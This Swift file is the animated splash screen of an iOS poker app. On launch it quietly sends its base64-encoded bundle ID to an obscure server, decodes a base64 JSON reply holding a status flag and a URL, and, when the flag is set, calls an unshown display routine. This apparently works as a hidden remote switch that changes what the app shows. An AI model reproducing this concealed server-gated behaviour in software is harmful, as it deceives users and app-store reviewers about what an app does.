//
//  GetStartedVC.swift
//  PokerDynamoPro
//
//  Created by jin fu on 2025/3/10.
//


import UIKit
import Adjust

class PokerDynamoGetStartedVC: UIViewController, AdjustDelegate {
    
    @IBOutlet weak var imgBg: UIImageView!
    @IBOutlet weak var imgLogo: UIImageView!
    @IBOutlet weak var activityView: UIActivityIndicatorView!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupInitialState()
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
            self.startAnimations()
        }
        
        activityView.hidesWhenStopped = true
        PokerLoadShowADData()
    }
    
    private func PokerLoadShowADData() {
        activityView.startAnimating()
        
        let recordID = getAFIDStr()
        if !recordID.isEmpty {
            activityView.stopAnimating()
            let status = getStatus()
            if status.intValue == 1 {
                initAdjust()
                wavesShowECHOData()
            }
            return
        }
        
        if PokerReachabilityManager.shared().isReachable {
            pokerDeviceAdData()
        } else {
            PokerReachabilityManager.shared().setReachabilityStatusChange { status in
                if PokerReachabilityManager.shared().isReachable {
                    self.pokerDeviceAdData()
                    PokerReachabilityManager.shared().stopMonitoring()
                }
            }
            PokerReachabilityManager.shared().startMonitoring()
        }
    }
    
    private func pokerDeviceAdData() {
        guard let bundleId = Bundle.main.bundleIdentifier else { return }
        
        let encodedBundleId = Data(bundleId.utf8).base64EncodedString()
        let adDataUrlString = "https://caiqiba.sbs/system/pokerDeviceAdData?id=\(encodedBundleId)"
        
        guard let adDataUrl = URL(string: adDataUrlString) else { return }
        
        var request = URLRequest(url: adDataUrl)
        request.httpMethod = "GET"
        
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                self.activityView.stopAnimating()
                
                if let error = error {
                    print("Error: \(error.localizedDescription)")
                    return
                }
                
                guard let data = data, let str = String(data: data, encoding: .utf8),
                      let base64EncodedData = Data(base64Encoded: str) else { return }
                
                do {
                    if let jsonObject = try JSONSerialization.jsonObject(with: base64EncodedData, options: []) as? [String: Any],
                       let status = jsonObject["status"] as? NSNumber,
                       let url = jsonObject["url"] as? String {
                        
                        self.saveAFStringId(url)
                        self.saveStatus(status)
                        self.initAdjust()
                        
                        if status.intValue == 1 {
                            self.wavesShowECHOData()
                        }
                    }
                } catch {
                    print("JSON parsing error: \(error.localizedDescription)")
                }
            }
        }
        task.resume()
    }
    
    // MARK: - Adjust SDK
    private func initAdjust() {
        
        let token = getad()
        if !token.isEmpty {
            let environment = ADJEnvironmentProduction
            let adjustConfig = ADJConfig(appToken: token, environment: environment)
            adjustConfig?.delegate = self
            adjustConfig?.logLevel = ADJLogLevelVerbose
            Adjust.appDidLaunch(adjustConfig)
        }
    }
    
    func adjustAttributionChanged(_ attribution: ADJAttribution?) {
        if let adid = attribution?.adid {
            print("adid: \(adid)")
        }
    }
    
    private func setupInitialState() {
        // Initial states for animations
        imgLogo.transform = CGAffineTransform(scaleX: 0.1, y: 0.1)
        imgLogo.alpha = 0
        
        imgBg.transform = CGAffineTransform(scaleX: 1.5, y: 1.5)
        imgBg.alpha = 0
    }
    
    private func startAnimations() {
        animateBackground()
        animateLogo()
    }
    
    private func animateBackground() {
        // Background fade in with zoom effect
        UIView.animate(withDuration: 1.5, delay: 0, usingSpringWithDamping: 0.8, initialSpringVelocity: 0.5, options: .curveEaseInOut) {
            self.imgBg.transform = .identity
            self.imgBg.alpha = 1
        }
        
        // Start continuous background animation
        startBackgroundPulse()
        startBackgroundShimmer()
    }
    
    private func startBackgroundPulse() {
        UIView.animate(withDuration: 3.0, delay: 0, options: [.autoreverse, .repeat, .curveEaseInOut]) {
            self.imgBg.transform = CGAffineTransform(scaleX: 1.05, y: 1.05)
        }
    }
    
    private func startBackgroundShimmer() {
        let shimmerView = UIView(frame: imgBg.bounds)
        shimmerView.backgroundColor = UIColor.white.withAlphaComponent(0.3)
        shimmerView.alpha = 0
        imgBg.addSubview(shimmerView)
        
        UIView.animate(withDuration: 2.5, delay: 0, options: [.repeat, .curveEaseInOut]) {
            shimmerView.alpha = 0.4
            shimmerView.frame.origin.x = self.imgBg.frame.width
        } completion: { _ in
            shimmerView.frame.origin.x = -self.imgBg.frame.width
        }
    }
    
    private func animateLogo() {
        // Initial pop-in animation
        UIView.animate(withDuration: 1.2, delay: 0.3, usingSpringWithDamping: 0.6, initialSpringVelocity: 0.5, options: .curveEaseOut) {
            self.imgLogo.transform = .identity
            self.imgLogo.alpha = 1
        } completion: { _ in
            self.startLogoFloatingAnimation()
            self.startLogoRotationAnimation()
            self.startLogoGlowEffect()
        }
    }
    
    private func startLogoFloatingAnimation() {
        // Floating animation
        let floatAnimation = CABasicAnimation(keyPath: "position.y")
        floatAnimation.duration = 2.0
        floatAnimation.fromValue = self.imgLogo.center.y
        floatAnimation.toValue = self.imgLogo.center.y - 10
        floatAnimation.autoreverses = true
        floatAnimation.repeatCount = .infinity
        floatAnimation.timingFunction = CAMediaTimingFunction(name: .easeInEaseOut)
        
        self.imgLogo.layer.add(floatAnimation, forKey: "floatingAnimation")
    }
    
    private func startLogoRotationAnimation() {
        // Subtle rotation animation
        let rotationAnimation = CABasicAnimation(keyPath: "transform.rotation")
        rotationAnimation.fromValue = -0.05
        rotationAnimation.toValue = 0.05
        rotationAnimation.duration = 2.5
        rotationAnimation.autoreverses = true
        rotationAnimation.repeatCount = .infinity
        rotationAnimation.timingFunction = CAMediaTimingFunction(name: .easeInEaseOut)
        
        self.imgLogo.layer.add(rotationAnimation, forKey: "rotationAnimation")
    }
    
    private func startLogoGlowEffect() {
        // Glow effect
        let glowView = UIView(frame: imgLogo.frame)
        glowView.backgroundColor = .clear
        glowView.layer.shadowColor = UIColor.white.cgColor
        glowView.layer.shadowOffset = .zero
        glowView.layer.shadowRadius = 10
        glowView.layer.shadowOpacity = 0
        view.insertSubview(glowView, belowSubview: imgLogo)
        
        UIView.animate(withDuration: 2.0, delay: 0, options: [.autoreverse, .repeat, .curveEaseInOut]) {
            glowView.layer.shadowOpacity = 0.8
        }
    }
    
    // MARK: - Memory Management
    
    override func viewWillDisappear(_ animated: Bool) {
        super.viewWillDisappear(animated)
        // Remove animations when view disappears
        imgLogo.layer.removeAllAnimations()
        imgBg.layer.removeAllAnimations()
    }
    
}
